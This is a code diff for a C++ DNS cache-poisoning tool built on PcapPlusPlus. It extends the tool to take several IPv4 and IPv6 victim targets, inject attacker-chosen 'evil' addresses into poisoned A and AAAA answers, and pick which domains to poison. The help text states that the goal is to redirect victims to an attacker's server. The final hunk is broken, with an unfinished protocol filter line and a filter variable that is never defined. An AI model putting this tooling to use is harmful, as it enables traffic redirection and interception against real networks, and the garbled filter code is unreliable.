@@ -3,12 +3,14 @@
 #include <EthLayer.h>
 #include <IPv4Layer.h>
 #include <UdpLayer.h>
+#include <PcapFilter.h>
 
 #include <chrono>
 #include <thread>
 #include <mutex>
 
 #include "Screen.h"
+#include "Utils.h"
 
 Arguments Program::args {};
 bool Program::isCapturing = false;
@@ -198,27 +200,26 @@ void PoisonDNSLayer(pcpp::DnsLayer& dnsLayer, const pcpp::DnsLayer& originalLaye
 
 void Program::PoisonARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
 {
-    pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
+    pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
     dnsLayer.addQuery(query);
     dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
 }
 
 void Program::PoisonAAAARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
 {
-    pcpp::IPv6DnsResourceData poisonedData(args.hostv6Address);
+    pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
     dnsLayer.addQuery(query);
     dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
 }
 
 void Program::ParseArguments(int argc, char* argv[])
 {
-    parser.add_argument("-t", "--target").required().help("IP Address of the machine whose cache to poison");
-    parser.add_argument("-i", "--interface").required().help("Network Interface to use (takes an IP address or a name");
+    parser.add_argument("-t", "--targets").required().help("A comma-separated of hosts (IPv4 or IPv6) without whitespace");
+    parser.add_argument("-i", "--interface").required().help("Network interface to use");
     parser.add_argument("-b", "--bad-ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
-    parser.add_argument("-d", "--domains").help("Specific domains to poison - enter them in a comma-separated list without spaces");
-    parser.add_argument("-k", "--keep-alive").default_value(false).implicit_value(true).help("Used to tell deserter that it should keep waiting for more probes even after a successful poisoning.");
+    parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");
 
     std::vector<std::string> errors;
     try
@@ -226,57 +227,64 @@ void Program::ParseArguments(int argc, char* argv[])
         parser.parse_args(argc, argv);
 
         // parse bad IP
-        args.hostAddress = pcpp::IPv4Address(parser.get("--bad-ip"));
-        if (!args.hostAddress.isValid())
+        args.evilIPv4 = pcpp::IPv4Address(parser.get("--bad-ip"));
+        if (!args.evilIPv4.isValid())
         {
-            errors.push_back("Invalid malicious IP specified!");
+            errors.emplace_back("Invalid malicious IPv4 specified!");
         }
 
         // parse bad IPv6
         if (parser.is_used("--bad-ipv6"))
         {
-            args.hostv6Address = pcpp::IPv6Address(parser.get("--bad-ipv6"));
-            if (!args.hostv6Address.isValid())
+            args.evilIPv6 = pcpp::IPv6Address(parser.get("--bad-ipv6"));
+            if (!args.evilIPv6.isValid())
             {
-                errors.push_back("Invalid malicious IPv6 specified!");
+                errors.emplace_back("Invalid malicious IPv6 specified!");
             }
         }
 
-        // parse interface
-        args.interfaceAddress = pcpp::IPv4Address(parser.get("--interface"));
-        if (!args.interfaceAddress.isValid())
+        // Parse interface
+        args.interface.name = parser.get("--interface");
+        args.interface.dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(args.interface.name);
+        if (!args.interface.dev) 
         {
-            args.interfaceName = parser.get("--interface"); // checking for a valid name is done later to keep the code cleaner
+            errors.emplace_back("Failed to use the specified interface");
         }
 
-        // parse target IP
-        args.targetIP = pcpp::IPv4Address(parser.get("--target"));
-        if(!args.targetIP.isValid())
+        // Parse targets
+        std::vector<std::string> targets = std::move(SplitString(parser.get("--targets"), ','));
+        for (const auto& t : targets)
         {
-            errors.push_back("Invalid target IP specified!");
+            pcpp::IPv4Address IPv4(t);
+            if (IPv4.isValid()) 
+            {
+                args.targetsV4.emplace_back(std::move(IPv4));
+                continue;
+            }
+            else
+            {
+                pcpp::IPv6Address IPv6(t);
+                if (IPv6.isValid())
+                {
+                    args.targetsV6.emplace_back(std::move(IPv6));
+                    continue;
+                }
+                else
+                {
+                    errors.emplace_back("Targets list contains an invalid IP address: " + t);
+                }
+            }
         }
 
-        // parse TTL
+        // Parse TTL
         args.poisonTtl = parser.get<uint32_t>("--ttl");
         
+        // Parse domains
         if(parser.is_used("--domains"))
         {
             args.specificDomains = true;
-            std::string domains = parser.get("--domains");
-            int i = 0;
-            size_t pos = 0;
-            // Put the domains in a list
-            while ((pos = domains.find(",")) != std::string::npos) 
-            {
-                args.domains.push_back(domains.substr(0, pos));
-                domains.erase(0, pos + 1);
-            }
-            args.domains.push_back(domains); // push the last element
-
-            std::sort(args.domains.begin(), args.domains.end());
+            args.domains = std::move(SplitString(parser.get("--domains"), ','));
         }
-
-        args.keepAlive = parser.get<bool>("--keep-alive");
         
         if(errors.size() != 0)
         {
@@ -295,42 +303,10 @@ void Program::ParseArguments(int argc, char* argv[])
         std::cout << parser;
         exit(0);
     }
-
-
 }
 
 void Program::InitCaptureInterface()
 {
-    if (args.interfaceAddress.isValid())
-    {
-        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(args.interfaceAddress);
-        if (dev)
-        {
-            args.interfaceName = dev->getName();
-        }
-        else
-        {
-            std::cerr << "Invalid interface." << std::endl;
-            exit(0);
-        }
-    }
-    else
-    {
-        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(args.interfaceName);
-        if (dev)
-        {
-            args.interfaceAddress = dev->getIPv4Address();
-        }
-        else
-        {
-            Screen::SetColour(Screen::ForegroundColour::Red);
-            std::cerr << "Invalid interface!" << std::endl;
-            Screen::Reset();
-
-            exit(0);
-        }
-    }
-
     if (!dev->open())
     {
         Screen::SetColour(Screen::ForegroundColour::Red);
@@ -340,9 +316,12 @@ void Program::InitCaptureInterface()
     }
 
     // Setup the filters
-    pcpp::IPFilter ipFilter(args.targetIP.toString(), pcpp::SRC);
 
-    if(!dev->setFilter(ipFilter))
+    pcpp::PortFilter portFilter(args.port, pcpp::Direction::DST);
+    pcpp::ProtoFilter udpFilter(pcpp::ProtocolType::);
+
+
+    if(!dev->setFilter(finalFilter))
     {
         Screen::SetColour(Screen::ForegroundColour::Red);
         std::cerr << "Failed to setup capture filters." << std::endl;
